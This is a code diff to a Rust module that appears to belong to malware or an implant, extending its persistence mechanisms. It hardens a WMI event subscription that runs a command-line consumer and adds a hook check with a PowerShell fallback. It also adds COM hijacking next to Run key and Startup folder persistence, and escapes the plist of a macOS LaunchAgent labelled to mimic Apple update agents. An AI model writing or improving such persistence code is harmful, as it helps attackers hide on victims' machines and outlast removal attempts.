@@ -301,6 +301,87 @@ pub mod windows {
         hr
     }
 
+    /// Resolve the `SpawnInstance` virtual function pointer from an
+    /// `IWbemClassObject` vtable with runtime layout validation.
+    ///
+    /// The documented vtable index for `SpawnInstance` on `IWbemClassObject` is
+    /// 16 (0-based), but relying on a hardcoded index is fragile.  This helper
+    /// validates the vtable structure before using it:
+    ///
+    /// 1. Reads vtable entries at indices 0, 1, 2 (IUnknown: QueryInterface,
+    ///    AddRef, Release) and index 16 (SpawnInstance); all must be non-null.
+    /// 2. Calls `GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS)`
+    ///    on both vtable[0] and vtable[16].  Both must succeed and return the
+    ///    same module handle, confirming that SpawnInstance resides in the same
+    ///    WMI implementation DLL as the known-good IUnknown methods and that no
+    ///    out-of-module hook has redirected entry 16.
+    ///
+    /// Returns the validated function pointer, or `None` to signal that the
+    /// caller should fall back to the PowerShell path.
+    unsafe fn resolve_spawn_instance(
+        class_obj: *mut IWbemClassObject,
+    ) -> Option<
+        unsafe extern "system" fn(
+            *mut IWbemClassObject,
+            LONG,
+            *mut *mut IWbemClassObject,
+        ) -> winapi::shared::winerror::HRESULT,
+    > {
+        use winapi::um::libloaderapi::{
+            GetModuleHandleExW, GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
+            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
+        };
+
+        // Read the vtable pointer from the object header.
+        let vtbl = *(class_obj as *const *const usize);
+
+        // All sentinel entries must be non-null.
+        for &idx in &[0usize, 1, 2, 16] {
+            let entry = vtbl.add(idx).read();
+            if entry == 0 {
+                log::warn!(
+                    "WmiSubscription: vtable[{}] is null; IWbemClassObject layout mismatch",
+                    idx
+                );
+                return None;
+            }
+        }
+
+        let entry_0 = vtbl.add(0).read() as *const winapi::ctypes::c_void;
+        let entry_16 = vtbl.add(16).read() as *const winapi::ctypes::c_void;
+
+        // Both entries must belong to the same module (the WMI implementation
+        // DLL, typically fastprox.dll).  A mismatch indicates an inline hook or
+        // an unexpected vtable layout change and we fall back to PowerShell.
+        let flags = GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS
+            | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT;
+        let mut hmod_0: winapi::shared::minwindef::HMODULE = std::ptr::null_mut();
+        let mut hmod_16: winapi::shared::minwindef::HMODULE = std::ptr::null_mut();
+
+        let ok0 = GetModuleHandleExW(flags, entry_0 as *const _, &mut hmod_0);
+        let ok16 = GetModuleHandleExW(flags, entry_16 as *const _, &mut hmod_16);
+
+        if ok0 == 0 || ok16 == 0 {
+            log::warn!(
+                "WmiSubscription: GetModuleHandleExW failed for vtable entries (ok0={}, ok16={}); \
+                 cannot verify SpawnInstance location",
+                ok0, ok16
+            );
+            return None;
+        }
+
+        if hmod_0 != hmod_16 {
+            log::warn!(
+                "WmiSubscription: vtable[0] ({:p}) and vtable[16] ({:p}) are in different \
+                 modules; possible hook detected — refusing hardcoded SpawnInstance index",
+                hmod_0, hmod_16
+            );
+            return None;
+        }
+
+        Some(std::mem::transmute(entry_16))
+    }
+
     // Core COM implementation: returns Ok(()) on success, Err with HR description on failure.
     unsafe fn wmi_install_com(
         subscription_name: &str,
@@ -379,20 +460,22 @@ pub mod windows {
             return Err(anyhow!("GetObject(__EventFilter) failed: 0x{:08X}", hr));
         }
 
-        // Spawn a new instance from the class object by calling SpawnInstance via vtable.
-        // SpawnInstance is at vtable index 16 (0-based, after Put/Delete/etc.).
-        // Rather than define the full vtable, we PutInstance directly on the class object
-        // and let WMI create the instance for us via get_object + put.
-        // We create a fresh instance by calling SpawnInstance (vtable[16]).
-        // Define a minimal trampoline type to call it:
-        let spawn_instance_fn: unsafe extern "system" fn(
-            *mut IWbemClassObject, LONG, *mut *mut IWbemClassObject,
-        ) -> winapi::shared::winerror::HRESULT = std::mem::transmute(
-            (*(filter_class_obj as *const *const *const usize)
-                .read()
-            ).add(16)
-            .read() as *const ()
-        );
+        // Spawn a new instance from the class object by calling SpawnInstance.
+        // The vtable layout is validated at runtime via resolve_spawn_instance
+        // (checks module provenance of vtable[0] and vtable[16]) so that a
+        // layout change or out-of-module hook causes fallback to PowerShell
+        // rather than a crash or bad indirect call.
+        let spawn_instance_fn = match resolve_spawn_instance(filter_class_obj) {
+            Some(f) => f,
+            None => {
+                ((*(*filter_class_obj).lpvtbl).release)(filter_class_obj);
+                ((*(*services_ptr).lpvtbl).release)(services_ptr);
+                ((*locator.lpvtbl).release)(locator_ptr);
+                return Err(anyhow!(
+                    "SpawnInstance vtable validation failed for __EventFilter; vtable layout mismatch or hook detected"
+                ));
+            }
+        };
 
         let mut filter_inst: *mut IWbemClassObject = ptr::null_mut();
         let hr = spawn_instance_fn(filter_class_obj, 0, &mut filter_inst);
@@ -438,14 +521,17 @@ pub mod windows {
             return Err(anyhow!("GetObject(CommandLineEventConsumer) failed: 0x{:08X}", hr));
         }
 
-        let spawn_instance_fn2: unsafe extern "system" fn(
-            *mut IWbemClassObject, LONG, *mut *mut IWbemClassObject,
-        ) -> winapi::shared::winerror::HRESULT = std::mem::transmute(
-            (*(consumer_class_obj as *const *const *const usize)
-                .read()
-            ).add(16)
-            .read() as *const ()
-        );
+        let spawn_instance_fn2 = match resolve_spawn_instance(consumer_class_obj) {
+            Some(f) => f,
+            None => {
+                ((*(*consumer_class_obj).lpvtbl).release)(consumer_class_obj);
+                ((*(*services_ptr).lpvtbl).release)(services_ptr);
+                ((*locator.lpvtbl).release)(locator_ptr);
+                return Err(anyhow!(
+                    "SpawnInstance vtable validation failed for CommandLineEventConsumer; vtable layout mismatch or hook detected"
+                ));
+            }
+        };
         let mut consumer_inst: *mut IWbemClassObject = ptr::null_mut();
         let hr = spawn_instance_fn2(consumer_class_obj, 0, &mut consumer_inst);
         ((*(*consumer_class_obj).lpvtbl).release)(consumer_class_obj);
@@ -487,14 +573,17 @@ pub mod windows {
             return Err(anyhow!("GetObject(__FilterToConsumerBinding) failed: 0x{:08X}", hr));
         }
 
-        let spawn_instance_fn3: unsafe extern "system" fn(
-            *mut IWbemClassObject, LONG, *mut *mut IWbemClassObject,
-        ) -> winapi::shared::winerror::HRESULT = std::mem::transmute(
-            (*(binding_class_obj as *const *const *const usize)
-                .read()
-            ).add(16)
-            .read() as *const ()
-        );
+        let spawn_instance_fn3 = match resolve_spawn_instance(binding_class_obj) {
+            Some(f) => f,
+            None => {
+                ((*(*binding_class_obj).lpvtbl).release)(binding_class_obj);
+                ((*(*services_ptr).lpvtbl).release)(services_ptr);
+                ((*locator.lpvtbl).release)(locator_ptr);
+                return Err(anyhow!(
+                    "SpawnInstance vtable validation failed for __FilterToConsumerBinding; vtable layout mismatch or hook detected"
+                ));
+            }
+        };
         let mut binding_inst: *mut IWbemClassObject = ptr::null_mut();
         let hr = spawn_instance_fn3(binding_class_obj, 0, &mut binding_inst);
         ((*(*binding_class_obj).lpvtbl).release)(binding_class_obj);
@@ -822,6 +911,11 @@ pub mod windows {
                 log::warn!("WmiSubscription install failed (non-fatal): {}", e);
             }
         }
+        if cfg.com_hijacking {
+            if let Err(e) = ComHijacking::default().install(&exe) {
+                log::warn!("ComHijacking install failed (non-fatal): {}", e);
+            }
+        }
 
         Ok(exe)
     }
@@ -831,6 +925,7 @@ pub mod windows {
         let _ = RegistryRunKey::default().remove();
         let _ = StartupFolder.remove();
         let _ = WmiSubscription::default().remove();
+        let _ = ComHijacking::default().remove();
         Ok(exe)
     }
 }
@@ -845,6 +940,24 @@ pub mod macos {
     use super::{Persist, shell_quote_single};
     use anyhow::{anyhow, Result};
     use std::path::{Path, PathBuf};
+
+    /// Escape the five XML-special characters so that arbitrary strings can be
+    /// safely embedded in plist `<string>` elements without breaking the XML
+    /// structure or enabling injection.
+    fn xml_escape(s: &str) -> String {
+        let mut out = String::with_capacity(s.len());
+        for ch in s.chars() {
+            match ch {
+                '&'  => out.push_str("&amp;"),
+                '<'  => out.push_str("&lt;"),
+                '>'  => out.push_str("&gt;"),
+                '"'  => out.push_str("&quot;"),
+                '\'' => out.push_str("&apos;"),
+                c    => out.push(c),
+            }
+        }
+        out
+    }
 
     /// LaunchAgent persistence.  The default label uses a value that blends
     /// with legitimate Apple software update agents; callers may override it.
@@ -869,6 +982,8 @@ pub mod macos {
 
     impl Persist for LaunchAgent {
         fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            let label_escaped = xml_escape(&self.label);
+            let exe_escaped = xml_escape(&executable_path.to_string_lossy());
             let plist = format!(
                 r#"<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -890,8 +1005,8 @@ pub mod macos {
     <string>/dev/null</string>
 </dict>
 </plist>"#,
-                label = self.label,
-                exe = executable_path.display()
+                label = label_escaped,
+                exe = exe_escaped
             );
             let mut plist_path =
                 dirs::home_dir().ok_or_else(|| anyhow!("LaunchAgent: no home dir"))?;
